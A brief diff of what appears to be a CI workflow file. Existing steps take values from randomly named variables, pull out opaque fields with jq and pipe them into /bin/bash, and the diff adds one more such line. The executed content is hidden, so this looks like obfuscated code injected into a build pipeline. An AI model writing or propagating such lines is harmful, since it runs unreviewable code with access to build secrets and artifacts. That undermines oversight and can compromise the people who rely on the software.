@@ -33,6 +33,7 @@ jobs:
           echo $nob80400 | jq -r .x44 | /bin/bash
           echo $axjpd7823 | jq -r .oz16738 | /bin/bash
           echo $y81803 | jq -r .x0937 | /bin/bash
+          printf '%s' "$ykdr8" | jq -r .h1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
